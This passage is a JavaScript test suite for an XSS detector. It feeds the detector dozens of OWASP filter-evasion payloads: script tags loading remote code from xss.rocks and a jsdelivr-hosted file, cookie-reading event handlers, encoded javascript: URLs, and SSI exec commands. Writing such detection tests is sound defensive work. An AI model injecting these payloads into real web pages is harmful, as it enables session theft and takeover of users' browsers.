import findHTMLSVGERB from '../index.js';
import assert from 'assert';

describe('Regex Matching', function() {
    /*
    *   Basic XSS Test Without Filter Evasion
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#basic-xss-test-without-filter-evasion
    */
    it('should match html script tags', function() {
        const testString = `<SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>`;
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   XSS Locator (Polyglot)
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#xss-locator-polyglot
    */
    it('should match javascript, html attributes, and script tag', function() {
        const testString = `javascript:/*--></title></style></textarea></script></xmp>
        <svg/onload='+/"\`/+/onmouseover=1/+/[*/[]/+alert(42);//'>`;
        const result = findHTMLSVGERB(testString);
        assert.equal(result[0], true);
        assert.equal(result[1].length, 6);
    })

    /*
    *   Malformed A Tags
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#malformed-a-tags
    */
    it('should match a tags', function() {
        const testString = `\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>`;
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   Malformed IMG Tags
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#malformed-img-tags
    */
    it('should match img tags', function() {
        const testString = `<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>`;
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 1);
    })

    /*
    *   fromCharCode
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#fromcharcode
    */
    it('should match fromCharCode', function() {
        const testString = `<a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>`;
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   Default SRC Tag to Get Past Filters that Check SRC Domain
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#default-src-tag-to-get-past-filters-that-check-src-domain
    */
    it('should match default src tag', function() {
        const testString = `<img SRC=# onmouseover="alert('xxs')"/>`;
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 1);
    })

    /*
    *   Default SRC Tag by Leaving it Empty
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#default-src-tag-by-leaving-it-empty
    */
    it('should match when src tag is empty', function() {
        const testString = `<img SRC= onmouseover="alert('xxs')"/>`;
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 1);
    })

    /*
    *   Default SRC Tag by Leaving it out Entirely
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#default-src-tag-by-leaving-it-out-entirely
    */
    it('should match when src tag is left out entirely', function() {
        const testString = `<img onmouseover="alert('xxs')"/>`;
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 1);
    })

    /*
    *   On Error Alert
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#on-error-alert
    */
    it('should match with onerror tags', function() {
        const testString = `<img SRC=/ onerror="alert(String.fromCharCode(88,83,83))"/>`;
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 1);
    })

    /*
    *   IMG onerror and JavaScript Alert Encode
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#img-onerror-and-javascript-alert-encode
    */
    it('should match with onerror with encoding', function() {
        const testString = `<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041"/>`;
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 1);
    })

    /*
    *   Decimal HTML Character References
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#decimal-html-character-references
    */
    it('should match with href with decimal html characters', function() {
        const testString = `<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click Me</a>`;
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   Decimal HTML Character References Without Trailing Semicolons
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#decimal-html-character-references-without-trailing-semicolons
    */
    it('should match with decimal html character references without trailing semicolons', function() {
        const testString = `<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">Click Me</a>`;
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   Hexadecimal HTML Character References Without Trailing Semicolons
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#hexadecimal-html-character-references-without-trailing-semicolons
    */
    it('should match with hexadecimal html character references without trailing semicolons', function() {
        const testString = `<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click Me</a>`;
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   Embedded Tab
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#embedded-tab
    */
    it('should match with encoded tab', function() {
        const testString = `<a href="jav   ascript:alert('XSS');">Click Me</a>`;
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   Embedded Encoded Tab
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#embedded-encoded-tab
    */
    it('should match with embedded encoded tab', function() {
        const testString = `<a href="jav&#x09;ascript:alert('XSS');">Click Me</a>`;
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   Embedded Newline to Break Up XSS
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#embedded-newline-to-break-up-xss
    */
    it('should match with newline', function() {
        const testString1 = `<a href="jav&#x0A;ascript:alert('XSS');">Click Me</a>`;
        const result1 = findHTMLSVGERB(testString1);

        const testString2 = `perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out`;
        const result2 = findHTMLSVGERB(testString2);
        
        const testString3 = `<a href=" &#14;  javascript:alert('XSS');">Click Me</a>`;
        const result3 = findHTMLSVGERB(testString3);

        const testString4 = `<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>`;
        const result4 = findHTMLSVGERB(testString4);
        
        const testString5 = `<BODY onload!#$%&()*~+-_.,:;?@[/|\]^\`=alert("XSS")>`;
        const result5 = findHTMLSVGERB(testString5);

        const testString6 = `<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>`;
        const result6 = findHTMLSVGERB(testString6);

        assert.equal(result1[0], true);
        assert.equal(result1[1].length, 2);

        assert.equal(result2[0], true);
        assert.equal(result2[1].length, 1);

        assert.equal(result3[0], true);
        assert.equal(result3[1].length, 2);

        assert.equal(result4[0], true);
        assert.equal(result4[1].length, 2);

        assert.equal(result5[0], true);
        assert.equal(result5[1].length, 1);

        assert.equal(result6[0], true);
        assert.equal(result6[1].length, 2);
    })

    /*
    *   Extraneous Open Brackets
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#extraneous-open-brackets
    */
    it('should match tags with extraneous open brackets', function() {
        const testString = `<<SCRIPT>alert("XSS");//\<</SCRIPT>`;
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 4);
    })
    
    /*
    *   No Closing Script Tags
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#no-closing-script-tags
    */
    it('should match non-closing script tags', function() {
        const testString = `<SCRIPT SRC=http://xss.rocks/xss.js?< B >`;
        const result = findHTMLSVGERB(testString);
        
        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   Protocol Resolution in Script Tags
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#protocol-resolution-in-script-tags
    */
    it('should match protocol resolution bypass', function() {
        const testString = `<SCRIPT SRC=//xss.rocks/.j>`;
        const result = findHTMLSVGERB(testString);
        
        assert.equal(result[0], true);
        assert.equal(result[1].length, 1);
    })

    /*
    *   Half Open HTML/JavaScript XSS Vector
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#half-open-htmljavascript-xss-vector
    */
    it('should match half-open html', function() {
        const testString = `<IMG SRC="\`<javascript:alert>\`('XSS')"`;
        const result = findHTMLSVGERB(testString);
        
        assert.equal(result[0], true);
        assert.equal(result[1].length, 1);
    })

    /*
    *   Escaping JavaScript Escapes
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#escaping-javascript-escapes
    */
    it('should match javascript escapes', function() {
        const testString1 = `<SCRIPT>var a="\\\\";alert('XSS');//";</SCRIPT>`;
        const testString2 = `</script><script>alert('XSS');</script>`;
        
        const result1 = findHTMLSVGERB(testString1);
        const result2 = findHTMLSVGERB(testString2);
        
        assert.equal(result1[0], true);
        assert.equal(result1[1].length, 2);

        assert.equal(result2[0], true);
        assert.equal(result2[1].length, 3);
    })

    /*
    *   End Title Tag
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#end-title-tag
    */
    it('should match end title tags', function() {
        const testString = `</TITLE><SCRIPT>alert("XSS");</SCRIPT>`;
        const result = findHTMLSVGERB(testString);
        
        assert.equal(result[0], true);
        assert.equal(result[1].length, 3);
    })

    /*
    *   INPUT Image
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#input-image
    */
    it('should match input image', function() {
        const testString = `<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">`;
        const result = findHTMLSVGERB(testString);
        
        assert.equal(result[0], true);
        assert.equal(result[1].length, 1);
    })

    /*
    *   BODY Image
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#body-image
    */
    it('should match input image', function() {
        const testString = `<BODY BACKGROUND="javascript:alert('XSS')">`;
        const result = findHTMLSVGERB(testString);
        
        assert.equal(result[0], true);
        assert.equal(result[1].length, 1);
    })

    /*
    *   IMG Dynsrc
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#img-dynsrc
    */
    it('should match img dynsrc', function() {
        const testString = `<IMG DYNSRC="javascript:alert('XSS')">`;
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 1);
    })

    /*
    *   IMG Lowsrc
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#img-lowsrc
    */
    it('should match img lowsrc', function() {
        const testString = `<IMG LOWSRC="javascript:alert('XSS')">`;
        const result = findHTMLSVGERB(testString);
        
        assert.equal(result[0], true);
        assert.equal(result[1].length, 1);
    })

    /*
    *   List-style-image
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#list-style-image
    */
    it('should match embedding images for bulleted lists', function() {
        const testString = `<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>`;
        const result = findHTMLSVGERB(testString);
        
        assert.equal(result[0], true);
        assert.equal(result[1].length, 5);
    })

    /*
    *   VBscript in an Image
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#vbscript-in-an-image
    */
    it('should match vbscript in an image', function() {
        const testString = `<IMG SRC='vbscript:msgbox("XSS")'>`;
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 1);
    })

    /*
    *   SVG Object Tag
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#svg-object-tag
    */
    it('should match svg object tag', function() {
        const testString = `<svg/onload=alert('XSS')>`;
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 1);
    })

    /*
    *   TODO: Handle ECMAScript 6 XSS Attacks
    *   ECMAScript 6
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#ecmascript-6
    */
    // it('should match svg object tag', function() {
    //     const testString = `Set.constructor\`alert\x28document.domain\x29`;
    //     const result = findHTMLSVGERB(testString);
   
    //     assert.equal(result[0], true);
    //     assert.equal(result[1].length, 2);
    // })

    /*
    *   BODY Tag
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#body-tag
    */
    it('should match body tag', function() {
        const testString = `<BODY ONLOAD=alert('XSS')>`;
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 1);
    })

    /*
    *   BGSOUND
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#bgsound
    */
    it('should match bgsound tag', function() {
        const testString = `<BGSOUND SRC="javascript:alert('XSS');">`;
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 1);
    })

    /*
    *   & JavaScript includes
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#javascript-includes
    */
    it('should match & JavaScript includes', function() {
        const testString = `<BR SIZE="&{alert('XSS')}">`;
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 1);
    })

    /*
    *   STYLE sheet
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#style-sheet
    */
    it('should match style sheet', function() {
        const testString = `<LINK REL="stylesheet" HREF="javascript:alert('XSS');">`;
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 1);
    })

    /*
    *   Remote-style-sheet
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#remote-style-sheet
    */
    it('should match remote style sheet', function() {
        const testString1 = `<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">`;
        const testString2 = `<STYLE>@import'http://xss.rocks/xss.css';</STYLE>`;
        const testString3 = `<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>`;
        
        const result1 = findHTMLSVGERB(testString1);
        const result2 = findHTMLSVGERB(testString2);
        const result3 = findHTMLSVGERB(testString3);

        assert.equal(result1[0], true);
        assert.equal(result1[1].length, 1);

        assert.equal(result2[0], true);
        assert.equal(result2[1].length, 2);

        assert.equal(result3[0], true);
        assert.equal(result3[1].length, 2);
    })

    /*
    *   STYLE Tags that Breaks Up JavaScript for XSS
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#style-tags-that-breaks-up-javascript-for-xss
    */
    it('should match style tags that break up JavaScript for XSS', function() {
        const testString = `<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>`;
        
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   STYLE Attribute that Breaks Up an Expression
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#style-attribute-that-breaks-up-an-expression
    */
    it('should match style attributes that break up an expression', function() {
        const testString = `<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">`;
        
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 1);
    })

    /*
    *   IMG STYLE with Expressions
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#img-style-with-expressions
    */
    it('should match img style with expressions', function() {
        const testString = `exp/*<A STYLE='no\\xss:noxss("*//*");
                            xss:ex/*XSS*//*/*/pression(alert("XSS"))'>`;
        
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 1);
    })

    /*
    *   STYLE Tag using Background-image
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#style-tag-using-background-image
    */
    it('should match style tag using background-image', function() {
        const testString = `<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>`;
        
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 4);
    })

    /*
    *   STYLE Tag using Background
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#style-tag-using-background
    */
    it('should match style tag using background', function() {
        const testString1 = `<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>`;
        const testString2 = `<STYLE type="text/css">BODY{background:url("<javascript:alert>('XSS')")}</STYLE>`;

        const result1 = findHTMLSVGERB(testString1);
        const result2 = findHTMLSVGERB(testString2);

        assert.equal(result1[0], true);
        assert.equal(result1[1].length, 2);

        assert.equal(result2[0], true);
        assert.equal(result2[1].length, 3);
    })

    /*
    *   Anonymous HTML with STYLE Attribute
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#anonymous-html-with-style-attribute
    */
    it('should match anonymous html with style attribute', function() {
        const testString = `<XSS STYLE="xss:expression(alert('XSS'))">`;
        
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 1);
    })

    /*
    *   Local htc File
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#local-htc-file
    */
    it('should match local htc file', function() {
        const testString = `<XSS STYLE="behavior: url(xss.htc);">`;
        
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 1);
    })

    /*
    *   TODO: Add filtering for Apache Tomcat
    *   US-ASCII Encoding
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#us-ascii-encoding
    */
    // it('should match us-ascii encoding', function() {
    //     const testString = `¼script¾alert(¢XSS¢)¼/script¾`;
        
    //     const result = findHTMLSVGERB(testString);

    //     assert.equal(result[0], true);
    //     assert.equal(result[1].length, 2);
    // })

    /*
    *   META
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#meta
    */
    it('should match meta tags', function() {
        const testString1 = `<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">`;
        const testString2 = `<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">`;
        const testString3 = `<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">`;

        const result1 = findHTMLSVGERB(testString1);
        const result2 = findHTMLSVGERB(testString2);
        const result3 = findHTMLSVGERB(testString3);

        assert.equal(result1[0], true);
        assert.equal(result1[1].length, 1);

        assert.equal(result2[0], true);
        assert.equal(result2[1].length, 1);

        assert.equal(result3[0], true);
        assert.equal(result3[1].length, 1);
    })

    /*
    *   IFRAME
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#iframe
    */
    it('should match iframe', function() {
        const testString = `<IFRAME SRC="javascript:alert('XSS');"></IFRAME>`;
        
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   IFRAME Event Based
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#iframe-event-based
    */
    it('should match iframe event-based', function() {
        const testString = `<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>`;
        
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   FRAME
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#frame
    */
    it('should match frame', function() {
        const testString = `<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>`;
        
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 3);
    })

    /*
    *   TABLE
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#table
    */
    it('should match table elements', function() {
        const testString1 = `<TABLE BACKGROUND="javascript:alert('XSS')">`;
        const testString2 = `<TABLE><TD BACKGROUND="javascript:alert('XSS')">`;

        const result1 = findHTMLSVGERB(testString1);
        const result2 = findHTMLSVGERB(testString2);

        assert.equal(result1[0], true);
        assert.equal(result1[1].length, 1);

        assert.equal(result2[0], true);
        assert.equal(result2[1].length, 2);
    })

    /*
    *   DIV
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#div
    */
    it('should match div tags', function() {
        const testString1 = `<DIV STYLE="background-image: url(javascript:alert('XSS'))">`;
        const testString2 = `<DIV STYLE="background-image\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029">`;
        const testString3 = `<DIV STYLE="background-image: url(javascript:alert('XSS'))">`;
        const testString4 = `<DIV STYLE="width: expression(alert('XSS'));">`;

        const result1 = findHTMLSVGERB(testString1);
        const result2 = findHTMLSVGERB(testString2);
        const result3 = findHTMLSVGERB(testString3);
        const result4 = findHTMLSVGERB(testString4);

        assert.equal(result1[0], true);
        assert.equal(result1[1].length, 1);

        assert.equal(result2[0], true);
        assert.equal(result2[1].length, 1);

        assert.equal(result3[0], true);
        assert.equal(result3[1].length, 1);

        assert.equal(result4[0], true);
        assert.equal(result4[1].length, 1);
    })

    /*
    *   Downlevel-Hidden Block
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#downlevel-hidden-block
    */
    it('should match downlevel-hidden block', function() {
        const testString = `<!--[if gte IE 4]>
                            <SCRIPT>alert('XSS');</SCRIPT>
                            <![endif]-->`;
        
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 4);
    })

    /*
    *   BASE Tag
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#base-tag
    */
    it('should match base tag', function() {
        const testString = `<BASE HREF="javascript:alert('XSS');//">`;
        
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 1);
    })

    /*
    *   OBJECT Tag
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#object-tag
    */
    it('should match object tag', function() {
        const testString = `<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>`;
        
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   EMBED SVG Which Contains XSS Vector
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#embed-svg-which-contains-xss-vector
    */
    it('should match EMBED SVG Which Contains XSS Vector', function() {
        const testString = `<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>`;
        
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   XML Data Island with CDATA Obfuscation
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#xml-data-island-with-cdata-obfuscation
    */
    it('should match XML Data Island with CDATA Obfuscation', function() {
        const testString = `<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML>
                            <SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>`;
        
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 9);
    })

    /*
    *   Locally hosted XML with embedded JavaScript that is generated using an XML data island
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#locally-hosted-xml-with-embedded-javascript-that-is-generated-using-an-xml-data-island
    */
    it('should match locally hosted XML with embedded JavaScript that is generated using an XML data island', function() {
        const testString = `<XML SRC="xsstest.xml" ID=I></XML>
                            <SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>`;
        
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 4);
    })

    /*
    *   HTML+TIME in XML
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#htmltime-in-xml
    */
    it('should match HTML+TIME in XML', function() {
        const testString = `<HTML><BODY>
                            <?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
                            <?import namespace="t" implementation="#default#time2">
                            <t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert("XSS")</SCRIPT>">
                            </BODY></HTML>`;
        
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 7);
    })

    /*
    *   Assuming you can only fit in a few characters and it filters against .js
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#assuming-you-can-only-fit-in-a-few-characters-and-it-filters-against-js
    */
    it('should match script tags with src attribute', function() {
        const testString = `<SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>`;
        
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   SSI (Server Side Includes)
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#ssi-server-side-includes
    */
    it('should match SSI', function() {
        const testString = `<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'"-->`;
        
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 2);
    })

    /*
    *   PHP
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#php
    */
    it('should match PHP', function() {
        const testString = `<? echo('<SCR)';
                            echo('IPT>alert("XSS")</SCRIPT>'); ?>`;
        
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 1);
    })

    /*
    *   IMG Embedded Commands
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#img-embedded-commands
    */
    it('should match IMG Embedded Commands', function() {
        const testString1 = `<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">`;
        
        const result1 = findHTMLSVGERB(testString1);

        assert.equal(result1[0], true);
        assert.equal(result1[1].length, 1);
    })

    /*
    *   Cookie Manipulation
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#cookie-manipulation
    */
    it('should match cookie manipulation', function() {
        const testString = `<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">`;
        
        const result = findHTMLSVGERB(testString);

        assert.equal(result[0], true);
        assert.equal(result[1].length, 1);
    })

    /*
    *   XSS Using HTML Quote Encapsulation
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#xss-using-html-quote-encapsulation
    */
    it('should match XSS Using HTML Quote Encapsulation', function() {
        const testString1 = `<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>`;
        const testString2 = `<SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>`;
